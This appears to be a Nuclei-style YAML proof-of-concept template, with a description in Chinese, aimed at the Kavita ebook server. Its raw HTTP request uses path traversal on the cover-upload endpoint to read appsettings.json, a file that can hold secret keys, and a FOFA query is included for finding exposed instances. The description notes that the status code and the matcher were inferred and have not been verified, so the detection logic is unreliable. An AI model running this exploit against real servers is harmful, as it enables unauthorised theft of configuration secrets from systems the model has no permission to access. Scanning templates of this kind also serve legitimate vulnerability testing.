id: poc-565d39ccb7fb89e96df6
info:
  name: Kavitacover-upload存在敏感信息泄露漏洞
  author: hacktwo
  severity: medium
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/565d39ccb7fb89e96df6a9f4e9af8a2c

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,info-leak,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 565d39ccb7fb89e96df6a9f4e9af8a2c
    fofa: + fofa`title="Kavita"`
http:
- raw:
  - 'GET /api/image/cover-upload?filename=../appsettings.json HTTP/2

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Upgrade-Insecure-Requests: 1

    Sec-Fetch-Dest: document

    Sec-Fetch-Mode: navigate

    Sec-Fetch-Site: none

    Sec-Fetch-User: ?1

    Te: trailers'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
